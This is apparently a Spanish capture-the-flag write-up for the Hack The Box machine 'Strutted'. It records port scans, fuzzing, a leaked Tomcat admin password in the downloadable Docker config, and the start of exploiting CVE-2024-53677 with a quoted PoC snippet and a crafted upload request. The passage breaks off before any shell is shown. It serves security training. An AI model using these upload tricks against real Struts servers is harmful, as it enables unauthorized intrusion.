
# Nmap
## Tcp Syn port scan

```bash
sudo nmap -sS -Pn -v -n -p- --min-rate 5000 strutted.htb -oG grepable
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-18 18:56 CET
Initiating SYN Stealth Scan at 18:56
Scanning strutted.htb (10.10.11.59) [65535 ports]
Discovered open port 80/tcp on 10.10.11.59
Discovered open port 22/tcp on 10.10.11.59
Completed SYN Stealth Scan at 18:57, 13.47s elapsed (65535 total ports)
Nmap scan report for strutted.htb (10.10.11.59)
Host is up (0.041s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

## SCV scan

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Strutted\xE2\x84\xA2 - Instant Image Uploads
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


# Puerto 80
### Nikto
```bash
nikto --url http://strutted.htb:80
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.11.59
+ Target Hostname:    strutted.htb
+ Target Port:        80
+ Start Time:         2025-02-18 18:59:52 (GMT1)
---------------------------------------------------------------------------
+ Server: nginx/1.18.0 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: Uncommon header 'cross-origin-embedder-policy-report-only' found, with contents: require-corp.
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ nginx/1.18.0 appears to be outdated (current is at least 1.20.1).
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .                                                          
+ /getaccess: This may be an indication that the server is running getAccess for SSO.                                
+ /siteminder: This may be an indication that the server is running Siteminder for SSO.                              
+ /tree: WASD Server reveals the entire web root structure and files via this URL. Upgrade to a later version and secure according to the documents on the WASD web site.
+ /submit?setoption=q&option=allowed_ips&value=255.255.255.255: MLdonkey 2.x allows administrative interface access to be access from any IP. This is typically only found on port 4080. See: OSVDB-3126
+ /doc: The /doc directory is browsable. This may be /usr/doc. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0678
+ /BACLIENT: IBM Tivoli default file found. See: OSVDB-2117
+ /server-status: This reveals Apache information. Comment out appropriate line in the Apache conf file or restrict access to allowed sources. See: OSVDB-561
+ /access-log: This might be interesting.
+ /access_log: This might be interesting.
+ /certificate: This might be interesting.
+ /certificates: This might be interesting.
+ /console: This might be interesting.
+ /error_log: This might be interesting.
+ /htpasswd: This might be interesting.
+ /js: This might be interesting.
+ /logfile: This might be interesting.
+ /mbox: This might be interesting.
+ /new: This might be interesting.
+ /news: This might be interesting.
+ /oracle: This might be interesting.
+ /passwd: This might be interesting.
+ /passwdfile: This might be interesting.
+ /password: This might be interesting.
+ /poll: This might be interesting.
+ /polls: This might be interesting.
+ /readme: This might be interesting.
+ /scratch: This might be interesting.
+ /spwd: This might be interesting.
+ /srchadm: This might be interesting.
+ /swf: This might be interesting: Flash files?.
+ /sam: This might be interesting.
+ /add_acl: This might be interesting: has been seen in web logs from an unknown scanner.
+ /dbabble: This might be interesting: has been seen in web logs from an unknown scanner.
+ /do_map: This might be interesting: has been seen in web logs from an unknown scanner.
+ /do_subscribe: This might be interesting: has been seen in web logs from an unknown scanner.
+ /netget?sid=Safety&amp;msg=2002&amp;file=Safety: This might be interesting: has been seen in web logs from an unkno
```
### Fuzzing
```bash
200      GET      182l      443w     6119c http://strutted.htb/how
200      GET        0l        0w 39680602c http://strutted.htb/download
200      GET        0l        0w 39680602c http://strutted.htb/download.action
200      GET      182l      567w     6610c http://strutted.htb/about
404      GET        1l       67w      770c http://strutted.htb/text/css
404      GET        1l       67w      770c http://strutted.htb/text/
400      GET       12l      137w     2006c http://strutted.htb/%7D
400      GET        1l       72w      771c http://strutted.htb/[
400      GET        1l       72w      771c http://strutted.htb/plain]
400      GET        1l       72w      771c http://strutted.htb/]
200      GET        0l        0w     5197c http://strutted.htb/scoop
400      GET        1l       72w      771c http://strutted.htb/quote]
400      GET       12l      137w     2010c http://strutted.htb/a0%7D
400      GET        1l       72w      771c http://strutted.htb/extension]
200      GET        0l        0w     5197c http://strutted.htb/fia

```
Main:
![[Pasted image 20250218190201.png]]
"We provide a Docker image that showcases the Strutted™ environment. Click the Download link on the menu to explore our Docker image to see how our platform is configured, and use it as a base template for your own projects."
### /how
![[Pasted image 20250218190327.png]]

Subimos una imagen y nos printea la imagen por pantalla; tambien un link para compartirla:

![[Pasted image 20250218190630.png]]

Le doy al boton de copy pero no parece subirme la imagen; miro el codigo fuente:
![[Pasted image 20250218190740.png]]
el codigo es el siguiente
```java
function() {
  // Select the text field
  shareableLink.select();
  shareableLink.setSelectionRange(0, 99999);

  // Copy the text inside the text field
  navigator.clipboard.writeText(shareableLink.value)
    .then(() => {
      // Success feedback
      copyButton.textContent = 'Copied!';
      copyButton.classList.remove('btn-outline-secondary');
      copyButton.classList.add('btn-success');
      setTimeout(() => {
        copyButton.textContent = 'Copy Shareable Link';
        copyButton.classList.remove('btn-success');
        copyButton.classList.add('btn-outline-secondary');
      }, 2000);
    })
    .catch(err => {
      // Error feedback
      console.error('Failed to copy: ', err);
      copyButton.textContent = 'Error!';
      copyButton.classList.remove('btn-outline-secondary');
      copyButton.classList.add('btn-danger');
      setTimeout(() => {
        copyButton.textContent = 'Copy Shareable Link';
        copyButton.classList.remove('btn-danger');
        copyButton.classList.add('btn-outline-secondary');
      }, 2000);
    });
}
```

Ejecuto por consola el botón;

![[Pasted image 20250218191249.png]]
	El error `Uncaught TypeError: navigator.clipboard is undefined` ocurre :

1. **Contexto de seguridad** : El acceso al portapapeles (`navigator.clipboard`) solo está permitido en contextos seguros (HTTPS). Si estás trabajando en un sitio que no utiliza HTTPS (por ejemplo, HTTP), el navegador bloqueará el acceso a `navigator.clipboard`.
    
2. **Políticas del navegador** : Algunos navegadores restringen el uso de `navigator.clipboard` si no se activa desde una acción de usuario real (como un clic).
    
3. **Consola del navegador** : Cuando intentas acceder a `navigator.clipboard` directamente desde la consola del navegador, el navegador podría interpretarlo como si no proviniera de una interacción de usuario, lo que también puede provocar este error.

Parece que el boton esta inoperativo

en el endpoint
```http
http://strutted.htb/download.action
```
Nos descarga un comprimido .zip ; listo los archivos:
```bash
7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=es_ES.UTF-8 Threads:5 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 39680602 bytes (38 MiB)

Listing archive: strutted.zip

--
Path = strutted.zip
Type = zip
Physical Size = 39680602

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2025-01-07 06:59:33 .....          615          293  Dockerfile
2025-01-07 06:59:33 .....         4064         1731  README.md
2025-01-07 06:59:33 .....         1361          786  context.xml
2025-01-07 06:59:33 D....            0            0  strutted
2025-01-07 06:59:33 .....         3999         1013  strutted/pom.xml
2025-01-07 06:59:33 .....         5810         2222  strutted/mvnw.cmd
2025-01-07 06:59:33 .....         9113         3030  strutted/mvnw
2025-01-07 06:59:33 D....            0            0  strutted/src
2025-01-07 06:59:33 D....            0            0  strutted/src/main
2025-01-07 06:59:33 D....            0            0  strutted/src/main/webapp
2025-01-07 07:00:20 D....            0            0  strutted/src/main/webapp/WEB-INF
2025-01-07 07:01:18 .....         4303         1436  strutted/src/main/webapp/WEB-INF/error.jsp
2025-01-07 06:59:33 .....         1117          409  strutted/src/main/webapp/WEB-INF/web.xml
2025-01-07 07:01:35 .....         4285         1402  strutted/src/main/webapp/WEB-INF/showImage.jsp
2025-01-07 07:11:38 .....         5647         1778  strutted/src/main/webapp/WEB-INF/upload.jsp
2025-01-07 07:01:26 .....         6125         1853  strutted/src/main/webapp/WEB-INF/how.jsp
2025-01-07 07:01:10 .....         6616         2208  strutted/src/main/webapp/WEB-INF/about.jsp
2025-01-07 07:01:45 .....         7120         2059  strutted/src/main/webapp/WEB-INF/success.jsp
2025-01-07 06:59:33 D....            0            0  strutted/src/main/java
2025-01-07 06:59:33 D....            0            0  strutted/src/main/java/org
2025-01-07 06:59:33 D....            0            0  strutted/src/main/java/org/strutted
2025-01-07 07:00:44 D....            0            0  strutted/src/main/java/org/strutted/htb
2025-01-07 06:59:33 .....         6656         1823  strutted/src/main/java/org/strutted/htb/Upload.java
2025-01-07 06:59:33 .....         1832          503  strutted/src/main/java/org/strutted/htb/URLMapping.java
2025-01-07 06:59:33 .....          199          147  strutted/src/main/java/org/strutted/htb/AboutAction.java
2025-01-07 06:59:33 .....         1582          630  strutted/src/main/java/org/strutted/htb/DatabaseUtil.java
2025-01-07 06:59:33 .....          197          147  strutted/src/main/java/org/strutted/htb/HowAction.java
2025-01-07 06:59:33 .....         1146          443  strutted/src/main/java/org/strutted/htb/URLUtil.java
2025-01-07 06:59:33 D....            0            0  strutted/src/main/resources
2025-01-07 07:00:54 .....         2145          678  strutted/src/main/resources/struts.xml
2025-01-07 06:59:33 D....            0            0  strutted/target
2025-01-07 06:59:33 D....            0            0  strutted/target/generated-sources
2025-01-07 06:59:33 D....            0            0  strutted/target/generated-sources/annotations
2025-01-07 06:59:33 D....            0            0  strutted/target/strutted-1.0.0
2025-01-07 06:59:33 D....            0            0  strutted/target/strutted-1.0.0/META-INF
2025-01-07 06:59:33 D....            0            0  strutted/target/strutted-1.0.0/WEB-INF
2025-01-07 06:59:33 .....          587          346  strutted/target/strutted-1.0.0/WEB-INF/error.jsp
2025-01-07 06:59:33 .....         1117          409  strutted/target/strutted-1.0.0/WEB-INF/web.xml
2025-01-07 06:59:33 D....            0            0  strutted/target/strutted-1.0.0/WEB-INF/lib
2025-01-07 06:59:33 .....       794034       738335  strutted/target/strutted-1.0.0/WEB-INF/lib/javassist-3.29.0-GA.jar
2025-01-07 06:59:33 .....     14259880     14221392  strutted/target/strutted-1.0.0/WEB-INF/lib/sqlite-jdbc-3.47.1.0.jar
2025-01-07 06:59:33 .....       632267       573075  strutted/target/strutted-1.0.0/WEB-INF/lib/commons-lang3-3.13.0.jar
2025-01-07 06:59:33 .....       264823       253389  strutted/target/strutted-1.0.0/WEB-INF/lib/ognl-3.3.4.jar
2025-01-07 06:59:33 .....        95505        83833  strutted/target/strutted-1.0.0/WEB-INF/lib/javax.servlet-api-4.0.1.jar
2025-01-07 06:59:33 .....        74132        64158  strutted/target/strutted-1.0.0/WEB-INF/lib/commons-fileupload-1.5.jar
2025-01-07 06:59:33 .....       238400       215227  strutted/target/strutted-1.0.0/WEB-INF/lib/commons-text-1.10.0.jar
2025-01-07 06:59:33 .....       313296       282310  strutted/target/strutted-1.0.0/WEB-INF/lib/log4j-api-2.20.0.jar
2025-01-07 06:59:33 .....      1519233      1360308  strutted/target/strutted-1.0.0/WEB-INF/lib/struts2-core-6.3.0.1.jar
2025-01-07 06:59:33 .....      1736381      1559626  strutted/target/strutted-1.0.0/WEB-INF/lib/freemarker-2.3.32.jar
2025-01-07 06:59:33 .....       483954       437052  strutted/target/strutted-1.0.0/WEB-INF/lib/commons-io-2.13.0.jar
2025-01-07 06:59:33 D....            0            0  strutted/target/strutted-1.0.0/WEB-INF/classes
2025-01-07 06:59:33 .....         2315          771  strutted/target/strutted-1.0.0/WEB-INF/classes/struts.xml
2025-01-07 06:59:33 D....            0            0  strutted/target/strutted-1.0.0/WEB-INF/classes/org
2025-01-07 06:59:33 D....            0            0  strutted/target/strutted-1.0.0/WEB-INF/classes/org/strutted
2025-01-07 06:59:33 D....            0            0  strutted/target/strutted-1.0.0/WEB-INF/classes/org/strutted/htb
2025-01-07 06:59:33 .....          454          290  strutted/target/strutted-1.0.0/WEB-INF/classes/org/strutted/htb/AboutAction.class
2025-01-07 06:59:33 .....         3276         1589  strutted/target/strutted-1.0.0/WEB-INF/classes/org/strutted/htb/URLMapping.class
2025-01-07 06:59:33 .....         1610          847  strutted/target/strutted-1.0.0/WEB-INF/classes/org/strutted/htb/URLUtil.class
2025-01-07 06:59:33 .....         7344         3859  strutted/target/strutted-1.0.0/WEB-INF/classes/org/strutted/htb/Upload.class
2025-01-07 06:59:33 .....         2899         1606  strutted/target/strutted-1.0.0/WEB-INF/classes/org/strutted/htb/DatabaseUtil.class
2025-01-07 06:59:33 .....          448          291  strutted/target/strutted-1.0.0/WEB-INF/classes/org/strutted/htb/HowAction.class
2025-01-07 06:59:33 .....         5651         1787  strutted/target/strutted-1.0.0/WEB-INF/upload.jsp
2025-01-07 06:59:33 .....         6125         1853  strutted/target/strutted-1.0.0/WEB-INF/how.jsp
2025-01-07 06:59:33 .....         6918         2254  strutted/target/strutted-1.0.0/WEB-INF/about.jsp
2025-01-07 06:59:33 .....         7120         2059  strutted/target/strutted-1.0.0/WEB-INF/success.jsp
2025-01-07 06:59:33 D....            0            0  strutted/target/classes
2025-01-07 06:59:33 .....         2315          771  strutted/target/classes/struts.xml
2025-01-07 06:59:33 D....            0            0  strutted/target/classes/org
2025-01-07 06:59:33 D....            0            0  strutted/target/classes/org/strutted
2025-01-07 06:59:33 D....            0            0  strutted/target/classes/org/strutted/htb
2025-01-07 06:59:33 .....          454          290  strutted/target/classes/org/strutted/htb/AboutAction.class
2025-01-07 06:59:33 .....         3276         1589  strutted/target/classes/org/strutted/htb/URLMapping.class
2025-01-07 06:59:33 .....         1610          847  strutted/target/classes/org/strutted/htb/URLUtil.class
2025-01-07 06:59:33 .....         7344         3859  strutted/target/classes/org/strutted/htb/Upload.class
2025-01-07 06:59:33 .....         2899         1606  strutted/target/classes/org/strutted/htb/DatabaseUtil.class
2025-01-07 06:59:33 .....          448          291  strutted/target/classes/org/strutted/htb/HowAction.class
2025-01-07 06:59:33 D....            0            0  strutted/target/maven-archiver
2025-01-07 06:59:33 .....           57           57  strutted/target/maven-archiver/pom.properties
2025-01-07 06:59:33 .....     19820601     19820617  strutted/target/strutted-1.0.0.war
2025-01-07 06:59:33 D....            0            0  strutted/target/maven-status
2025-01-07 06:59:33 D....            0            0  strutted/target/maven-status/maven-compiler-plugin
2025-01-07 06:59:33 D....            0            0  strutted/target/maven-status/maven-compiler-plugin/compile
2025-01-07 06:59:33 D....            0            0  strutted/target/maven-status/maven-compiler-plugin/compile/default-compile
2025-01-07 06:59:33 .....          199           83  strutted/target/maven-status/maven-compiler-plugin/compile/default-compile/createdFiles.lst
2025-01-07 06:59:33 .....          589          129  strutted/target/maven-status/maven-compiler-plugin/compile/default-compile/inputFiles.lst
2025-01-07 06:59:33 .....          222          138  tomcat-users.xml
------------------- ----- ------------ ------------  ------------------------
2025-01-07 07:11:38           40371715     39661534  56 files, 30 folders

```

Parece un docker configurado con el setup de la propia pagina; voy a montar el docker para examinarlo mas a fondo;

```bash
zip docker build -t strutted:latest .
[+] Building 65.6s (18/18) FINISHED                                                                                                    docker:default
 => [internal] load build definition from Dockerfile                                                                                             0.1s
 => => transferring dockerfile: 654B                                                                                                             0.0s
 => [internal] load metadata for docker.io/library/tomcat:9.0                                                                                    1.8s
 => [internal] load metadata for docker.io/library/openjdk:17-jdk-alpine                                                                         1.9s
 => [internal] load .dockerignore                                                                                                                0.1s
 => => transferring context: 2B                                                                                                                  0.0s
 => [stage-0 1/5] FROM docker.io/library/openjdk:17-jdk-alpine@sha256:4b6abae565492dbe9e7a894137c966a7485154238902f2f25e9dbd9784383d81          12.6s
 => => resolve docker.io/library/openjdk:17-jdk-alpine@sha256:4b6abae565492dbe9e7a894137c966a7485154238902f2f25e9dbd9784383d81                   0.2s
 => => sha256:4b6abae565492dbe9e7a894137c966a7485154238902f2f25e9dbd9784383d81 319B / 319B                                                       0.0s
 => => sha256:a996cdcc040704ec6badaf5fecf1e144c096e00231a29188596c784bcf858d05 951B / 951B                                                       0.0s
 => => sha256:264c9bdce361556ba6e685e401662648358980c01151c3d977f0fdf77f7c26ab 3.48kB / 3.48kB                                                   0.0s
 => => sha256:5843afab387455b37944e709ee8c78d7520df80f8d01cf7f861aae63beeddb6b 2.81MB / 2.81MB                                                   0.6s
 => => sha256:53c9466125e464fed5626bde7b7a0f91aab09905f0a07e9ad4e930ae72e0fc63 928.44kB / 928.44kB                                               0.4s
 => => sha256:d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662 186.80MB / 186.80MB                                               6.7s
 => => extracting sha256:5843afab387455b37944e709ee8c78d7520df80f8d01cf7f861aae63beeddb6b                                                        0.1s
 => => extracting sha256:53c9466125e464fed5626bde7b7a0f91aab09905f0a07e9ad4e930ae72e0fc63                                                        0.1s
 => => extracting sha256:d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662                                                        2.8s
 => [internal] load build context                                                                                                                0.5s
 => => transferring context: 40.38MB                                                                                                             0.3s
 => [stage-1 1/7] FROM docker.io/library/tomcat:9.0@sha256:198d5da39249fba1ba899e34e40ea471bab4faf30cf9b3686db8a9098df18562                     35.2s
 => => resolve docker.io/library/tomcat:9.0@sha256:198d5da39249fba1ba899e34e40ea471bab4faf30cf9b3686db8a9098df18562                              0.3s
 => => sha256:b7797ab8ba0bdfb722ad632172c7ab4abed5f0a19cabbd53bd9eec03eaa5e32c 12.56kB / 12.56kB                                                 0.0s
 => => sha256:198d5da39249fba1ba899e34e40ea471bab4faf30cf9b3686db8a9098df18562 6.63kB / 6.63kB                                                   0.0s
 => => sha256:bf8a242c4f77e92e36e505b08ccb4089d42d05cbf863185b0bc0626c5a214e93 2.72kB / 2.72kB                                                   0.0s
 => => sha256:5a7813e071bfadf18aaa6ca8318be4824a9b6297b3240f2cc84c1db6f4113040 29.75MB / 29.75MB                                                 1.5s
 => => sha256:8dbbbc6af9dc7b3eec20b35797f66551a17f035a85f020fc99a0457dd268aae8 22.94MB / 22.94MB                                                 1.6s
 => => extracting sha256:5a7813e071bfadf18aaa6ca8318be4824a9b6297b3240f2cc84c1db6f4113040                                                        1.8s
 => => sha256:a10b6847b9f1913a9d34980e0354787e49b068cdbdd78c70bab054c6cfbd1660 157.59MB / 157.59MB                                              11.8s
 => => sha256:dcc1c5ea3c7d921e35f64dce04af1c8a2cd97954281eb6af66f6067f6c2c319b 158B / 158B                                                       2.0s
 => => sha256:91e6cc55403ad09f9aeca15ab95bf547ad0b78be2b665c486beef7161150987d 2.28kB / 2.28kB                                                   2.4s
 => => sha256:eb56afb50b158a892d0e32e567930b208efa36d10b72f06b747121890909026d 139B / 139B                                                       2.7s
 => => sha256:4f4fb700ef54461cfa02571ae0db9a0dc1e0cdb5577484a6d75e68dc38e8acc1 32B / 32B                                                         3.0s
 => => sha256:9bb5b124edf974ec5d68e65f11e2285e02c624c91ab61c4936364dcbd5a9de2a 28.71MB / 28.71MB                                                 4.1s
 => => extracting sha256:8dbbbc6af9dc7b3eec20b35797f66551a17f035a85f020fc99a0457dd268aae8                                                        1.6s
 => => extracting sha256:a10b6847b9f1913a9d34980e0354787e49b068cdbdd78c70bab054c6cfbd1660                                                        2.8s
 => => extracting sha256:dcc1c5ea3c7d921e35f64dce04af1c8a2cd97954281eb6af66f6067f6c2c319b                                                        0.0s
 => => extracting sha256:91e6cc55403ad09f9aeca15ab95bf547ad0b78be2b665c486beef7161150987d                                                        0.0s
 => => extracting sha256:eb56afb50b158a892d0e32e567930b208efa36d10b72f06b747121890909026d                                                        0.0s
 => => extracting sha256:4f4fb700ef54461cfa02571ae0db9a0dc1e0cdb5577484a6d75e68dc38e8acc1                                                        0.0s
 => => extracting sha256:9bb5b124edf974ec5d68e65f11e2285e02c624c91ab61c4936364dcbd5a9de2a                                                        0.8s 
 => [stage-0 2/5] RUN apk add --no-cache maven                                                                                                  20.8s 
 => [stage-0 3/5] COPY strutted /tmp/strutted                                                                                                    1.1s 
 => [stage-0 4/5] WORKDIR /tmp/strutted                                                                                                          0.6s 
 => [stage-0 5/5] RUN mvn clean package                                                                                                         25.7s 
 => [stage-1 2/7] RUN rm -rf /usr/local/tomcat/webapps/                                                                                          0.9s 
 => [stage-1 3/7] RUN mv /usr/local/tomcat/webapps.dist/ /usr/local/tomcat/webapps/                                                              1.1s 
 => [stage-1 4/7] RUN rm -rf /usr/local/tomcat/webapps/ROOT                                                                                      0.8s 
 => [stage-1 5/7] COPY --from=0 /tmp/strutted/target/strutted-1.0.0.war /usr/local/tomcat/webapps/ROOT.war                                       0.6s 
 => [stage-1 6/7] COPY ./tomcat-users.xml /usr/local/tomcat/conf/tomcat-users.xml                                                                0.3s 
 => [stage-1 7/7] COPY ./context.xml /usr/local/tomcat/webapps/manager/META-INF/context.xml                                                      0.4s 
 => exporting to image                                                                                                                           0.7s 
 => => exporting layers                                                                                                                          0.6s 
 => => writing image sha256:bb85931a61a85610dc1bed3bc85ad5c0f2bb40181965c8deee6a7914915ae928                                                     0.0s 
                                                                                                                                                      
 1 warning found (use docker --debug to expand):
 - FromPlatformFlagConstDisallowed: FROM --platform flag should not use constant value "linux/amd64" (line 1)
```

## Interesting files
```bash
 zip cat tomcat-users.xml 
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: tomcat-users.xml
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ <?xml version='1.0' encoding='utf-8'?>
   2   │ 
   3   │ <tomcat-users>
   4   │     <role rolename="manager-gui"/>
   5   │     <role rolename="admin-gui"/>
   6   │     <user username="admin" password="skqKY6360z!Y" roles="manager-gui,admin-gui"/>
   7   │ </tomcat-users>

```

Iniciamos el container

```bash
sudo docker run strutted:latest -p 127.0.0.1:8080:8080
```

abrimos el puerto 8080 porque nos levanta ahi el servidor web
![[Pasted image 20250218193053.png]]
ahora si que funciona el boton de share
![[Pasted image 20250218193125.png]]
la url es la siguiente:
```http
http://localhost:8080/upload.action;jsessionid=77B072C79D33493E1F925B50D9C382DD
```

Observo que la url nos lleva al archivo subido en el servidor y coge el nombre de nuestra cookie `jsessionid`;
![[Pasted image 20250218193246.png]]

La url del boton copy es la siguiente
```http
http://localhost:8080/s/0eee89ed
```
pruebo a subirle otra imagen y me devuelve la siguiente url

```http
http://localhost:8080/s/1eb4f0d5
```

Deduzco que le genera un nombre aleatorio a cada archivo subido por lo que encontrar el que subimos en el servidor real se nos complica;

Encuentro el path donde se suben las imagenes dentro del container;
```bash
root@7c452e833a19:/usr/local/tomcat/webapps/ROOT/uploads# tree .
.
├── 20250218_183101
│   └── john.png
├── 20250218_183424
│   └── john.png
└── 20250218_183515
    └── 2024-11-19_18-50.png

```


## tomcat 

Ya que es un tomcat y por tanto un proyecto java buscamos donde esta el pom.xml

```bash
root@7c452e833a19:/usr/local/tomcat# find / -type f -name pom.xml 
/usr/local/tomcat/webapps/ROOT/META-INF/maven/org.strutted.htb/strutted/pom.xml
```

POM.xml:
```xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <packaging>war</packaging>

    <artifactId>strutted</artifactId>
    <groupId>org.strutted.htb</groupId>
    <version>1.0.0</version>

    <name>Strutted™</name>
    <description>Instantly upload an image and receive a unique, shareable link. Keep your images secure, accessible, and easy to share—anywhere, anytime.</description>

    <properties>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
        <maven.compiler.source>17</maven.compiler.source>
        <maven.compiler.target>17</maven.compiler.target>
        <struts2.version>6.3.0.1</struts2.version>
        <jetty-plugin.version>9.4.46.v20220331</jetty-plugin.version>
        <maven.javadoc.skip>true</maven.javadoc.skip>
        <jackson.version>2.14.1</jackson.version>
        <jackson-data-bind.version>2.14.1</jackson-data-bind.version>
    </properties>

    <dependencyManagement>
        <dependencies>
            <dependency>
                <groupId>javax.servlet</groupId>
                <artifactId>javax.servlet-api</artifactId>
                <version>4.0.1</version>
                <scope>compile</scope>
            </dependency>

            <dependency>
                <groupId>org.apache.struts</groupId>
                <artifactId>struts2-core</artifactId>
                <version>${struts2.version}</version>
            </dependency>

            <dependency>
                <groupId>org.apache.struts</groupId>
                <artifactId>struts2-config-browser-plugin</artifactId>
                <version>${struts2.version}</version>
            </dependency>

            <dependency>
                <groupId>com.fasterxml.jackson.core</groupId>
                <artifactId>jackson-databind</artifactId>
                <version>${jackson-data-bind.version}</version>
            </dependency>
            <dependency>
                <groupId>com.fasterxml.jackson.dataformat</groupId>
                <artifactId>jackson-dataformat-xml</artifactId>
                <version>${jackson.version}</version>
            </dependency>


        </dependencies>
    </dependencyManagement>

    <dependencies>
        <dependency>
            <groupId>org.apache.struts</groupId>
            <artifactId>struts2-core</artifactId>
        </dependency>
        <dependency>
            <groupId>javax.servlet</groupId>
            <artifactId>javax.servlet-api</artifactId>
        </dependency>
        <dependency>
          <groupId>org.xerial</groupId>
          <artifactId>sqlite-jdbc</artifactId>
          <version>3.47.1.0</version>
        </dependency>
    </dependencies>

    <build>
        <plugins>
            <plugin>
                <groupId>org.eclipse.jetty</groupId>
                <artifactId>jetty-maven-plugin</artifactId>
                <version>${jetty-plugin.version}</version>
                <configuration>
                    <webApp>
                        <contextPath>/${project.artifactId}</contextPath>
                    </webApp>
                    <stopKey>CTRL+C</stopKey>
                    <stopPort>8999</stopPort>
                    <httpConnector>
                        <port>9999</port>
                    </httpConnector>
                    <scanIntervalSeconds>10</scanIntervalSeconds>
                </configuration>
            </plugin>
        </plugins>

        <pluginManagement>
            <plugins>
                <plugin>
                    <groupId>org.apache.maven.plugins</groupId>
                    <artifactId>maven-war-plugin</artifactId>
                    <version>3.4.0</version>
                </plugin>
            </plugins>
        </pluginManagement>

    </build>
</project>

```

observamos que esta usando el MVC framework apache struts
En el struts2.version vemos la version:
```xml
<struts2.version>6.3.0.1</struts2.version>
```

Investigando encontramos un par de vulnerabilidades;
https://security.snyk.io/package/maven/org.apache.struts%3Astruts2-core/6.3.0.1

## **[CVE-2024-53677](https://github.com/EQSTLab/CVE-2024-53677)**

CVE-2024-53677 : File upload logic in Apache Struts is flawed. An attacker can manipulate file upload params to enable paths traversal and under some circumstances this can lead to uploading a malicious file which can be used to perform Remote Code Execution. This issue affects Apache Struts: from 2.0.0 before 6.4.0. Users are recommended to upgrade to version 6.4.0 at least and migrate to the new file upload mechanism [https://struts.apache.org/core-developers/file-upload](https://struts.apache.org/core-developers/file-upload) . If you are not using an old file upload logic based on FileuploadInterceptor your application is safe. You can find more details in [https://cwiki.apache.org/confluence/display/WW/S2-067](https://cwiki.apache.org/confluence/display/WW/S2-067).



Encuentro este articulo que explica la vulneravilidad donde el upload puede llevar a RCE
https://blogs.hiteshpatra.in/cve-2024-53677-apache-struts-file-upload-vulnerability-leading-to-rce

Para explotar esta vulnerabilidad como dice el informe probaremos un file traversal en el lado de subir la imagen para ver si nuestro archivo se sube donde no debiera, vamos a capturar la solicitud con burp y ver el resultado en nuestro docker . 


en el repeater intento simplificar el texto de la subida de imagen lo maximo posible. pruebo con algun parametro pero la pagina bloquea cualquier cosa que no sea una imagen
![[Pasted image 20250219190254.png]]

Se suben las imagenes pero el contenido debe de ser de imagen 
![[Pasted image 20250219190345.png]]

Para explotar el cve meto otro parametro a la solicitud de subida de archivos :

Mirando el Poc se le anade lo siguiente a la solicitud de burp
```python
  # Attempt to overwrite file name using OGNL binding
    files = {
        "upload": ("test.txt", harmless_content, "text/plain"),
        "top.uploadFileName": test_filename  # Attempt filename overwrite
    }

    # Custom Content-Type boundary
    boundary = "----WebKitFormBoundary" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=16))
    m = MultipartEncoder(fields=files, boundary=boundary)
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": m.content_type
    }
```

La petición queda tal que asi :
```http
POST /upload.action;jsessionid=12027ECD4EDE843F44D6C8932AB3E1BE HTTP/1.1
Host: localhost:8080
Content-Length: 324
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="131", "Not_A Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Accept-Language: es-ES,es;q=0.9
Origin: http://localhost:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJHdpaH6gDs4Syohg
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost:8080/
Accept-Encoding: gzip, deflate, br
Cookie: JSESSIONID=12027ECD4EDE843F44D6C8932AB3E1BE
Connection: keep-alive

------WebKitFormBoundaryJHdpaH6gDs4Syohg
Content-Disposition: form-data; name="upload"; filename="whoa3mi.jpeg"
Content-Type: image/png

PNG

whoami

